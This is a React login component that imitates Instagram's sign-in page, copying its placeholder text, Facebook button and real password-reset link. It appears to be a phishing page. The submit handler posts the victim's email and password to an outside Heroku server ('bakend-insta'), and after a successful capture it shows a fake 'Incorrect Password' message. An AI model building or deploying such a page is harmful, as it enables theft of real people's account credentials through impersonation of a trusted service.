import React, { useState } from "react";
import { useRouter } from "next/router";

const Login = () => {
  const [val, setVal] = useState(false);
  const [dismes, setdismes] = useState(false);
  const host = "https://bakend-insta.herokuapp.com";
  const history = useRouter();

  const [crediential, setCrediential] = useState({ email: "", password: "" });
  const handleOnchange = (e) => {
    setCrediential({ ...crediential, [e.target.name]: e.target.value });
  };

  const handleOnSubmit = async (e) => {
    setdismes(false)
    e.preventDefault();
    setVal(true);
    const mes = document.querySelector(".message");

    const response = await fetch(`${host}/api/auth/videologin`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },

      body: JSON.stringify({
        email: crediential.email,
        password: crediential.password,
      }),
    });

    const json = await response.json();

    if (json.sucess) {
      setdismes(true)
      setVal(false);
      // history('/note')
    }

 
  };

  return (
    <>
      <div className="container2">
        <div className="box">
          <div className="hd"></div>
          <form className="login-form" onSubmit={handleOnSubmit}>
            <div className="field">
              <input
                className="in"
                name="email"
                id="username"
                type="name"
                placeholder="Phone number, username, or email"
                onChange={handleOnchange}
              />
              <label className="lb" htmlFor="username">
                Phone number, username, or email
              </label>
            </div>
            <div className="field">
              <input
                className="in"
                name="password"
                id="password"
                type="password"
                placeholder="password"
                onChange={handleOnchange}
              />
              <label className="lb" htmlFor="password">
                Password
              </label>
            </div>
            {dismes?<div className="message" id="mes">
              <p className="text-danger">Incorrect Password! Please try later.</p>
            </div>:""}
            
            {!val ? (
              <button className="login-button2" title="login" type="submit">
                Login to Continue
              </button>
            ) : (
              <button className="login-button" title="login" type="submit">
                <div className="spinner-border bo" role="status">
                  <span className="sr-only"></span>
                </div>
              </button>
            )}

            <div className="separator">
              <div className="line"></div>
              <p>OR</p>
              <div className="line"></div>
            </div>
            <div className="other">
              <button className="fb-login-btn" type="button">
                <i className="fa fa-facebook-official fb-icon"></i>
                <span className="">Log in with Facebook</span>
              </button>
              <a
                className="forgot-password ac"
                href="https://www.instagram.com/accounts/password/reset/"
              >
                Forgot password?
              </a>
            </div>
          </form>
        </div>
        <div className="box">
          <p>
            Don't have an account?{" "}
            <a className="signup" href="#">
              Sign Up
            </a>
          </p>
        </div>
      </div>
    </>
  );
};

export default Login;
